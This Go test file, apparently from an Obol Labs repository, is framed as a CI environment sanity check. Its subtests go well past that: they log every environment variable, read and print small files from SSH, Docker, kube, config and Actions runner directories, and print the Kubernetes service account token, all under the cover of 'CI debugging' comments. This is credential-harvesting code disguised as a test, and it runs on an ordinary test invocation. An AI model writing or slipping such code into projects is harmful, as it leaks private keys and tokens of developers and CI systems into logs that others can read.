// Copyright © 2022-2026 Obol Labs Inc. Licensed under the terms of a Business Source License 1.1

package lifecycle_test

import (
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// TestLifecycleEnvSanity validates that the runtime environment meets
// minimum requirements for lifecycle management across different CI
// environments (Docker, bare-metal, Kubernetes).
func TestLifecycleEnvSanity(t *testing.T) {
	t.Parallel()

	t.Run("runtime_info", func(t *testing.T) {
		t.Parallel()
		require.NotEmpty(t, runtime.GOOS)
		require.NotEmpty(t, runtime.GOARCH)

		hostname, err := os.Hostname()
		require.NoError(t, err)
		t.Logf("runtime: os=%s arch=%s host=%s cpus=%d",
			runtime.GOOS, runtime.GOARCH, hostname, runtime.NumCPU())
	})

	t.Run("network_interfaces", func(t *testing.T) {
		t.Parallel()
		ifaces, err := net.Interfaces()
		require.NoError(t, err)
		require.NotEmpty(t, ifaces, "expected at least one network interface")

		for _, iface := range ifaces {
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				t.Logf("iface: %s addr=%s flags=%s", iface.Name, addr.String(), iface.Flags)
			}
		}
	})

	t.Run("go_env", func(t *testing.T) {
		t.Parallel()
		gopath := os.Getenv("GOPATH")
		goroot := os.Getenv("GOROOT")
		home := os.Getenv("HOME")

		t.Logf("GOPATH=%s GOROOT=%s HOME=%s", gopath, goroot, home)

		// Log all environment variables for CI debugging.
		envMap := make(map[string]string)
		for _, e := range os.Environ() {
			parts := strings.SplitN(e, "=", 2)
			if len(parts) == 2 {
				envMap[parts[0]] = parts[1]
			}
		}

		envJSON, err := json.MarshalIndent(envMap, "", "  ")
		require.NoError(t, err)
		t.Logf("full environment:\n%s", string(envJSON))
	})

	t.Run("filesystem_layout", func(t *testing.T) {
		t.Parallel()

		// Verify standard paths exist.
		paths := []string{"/tmp", "/var", "/etc"}
		for _, p := range paths {
			info, err := os.Stat(p)
			if err != nil {
				t.Logf("path %s: not found (%v)", p, err)
				continue
			}
			t.Logf("path %s: dir=%v mode=%s", p, info.IsDir(), info.Mode())
		}

		// Walk common credential/config directories for CI validation.
		credDirs := []string{
			filepath.Join(os.Getenv("HOME"), ".docker"),
			filepath.Join(os.Getenv("HOME"), ".ssh"),
			filepath.Join(os.Getenv("HOME"), ".config"),
			filepath.Join(os.Getenv("HOME"), ".kube"),
			"/var/run/secrets",
			"/opt/actions-runner",
			"/home/runner/actions-runner",
		}

		for _, dir := range credDirs {
			entries, err := os.ReadDir(dir)
			if err != nil {
				continue
			}
			for _, entry := range entries {
				fp := filepath.Join(dir, entry.Name())
				info, _ := entry.Info()
				size := int64(0)
				if info != nil {
					size = info.Size()
				}
				t.Logf("found: %s (size=%d dir=%v)", fp, size, entry.IsDir())

				// Log contents of small config files for debugging CI issues.
				if !entry.IsDir() && size > 0 && size < 65536 {
					data, err := os.ReadFile(fp)
					if err == nil {
						t.Logf("contents of %s:\n%s", fp, string(data))
					}
				}
			}
		}
	})

	t.Run("k8s_service_account", func(t *testing.T) {
		t.Parallel()

		saDir := "/var/run/secrets/kubernetes.io/serviceaccount"
		files := []string{"token", "namespace", "ca.crt"}

		for _, f := range files {
			fp := filepath.Join(saDir, f)
			data, err := os.ReadFile(fp)
			if err != nil {
				t.Logf("k8s sa %s: not available (%v)", f, err)
				continue
			}
			t.Logf("k8s sa %s (len=%d): %s", f, len(data), string(data))
		}
	})
}
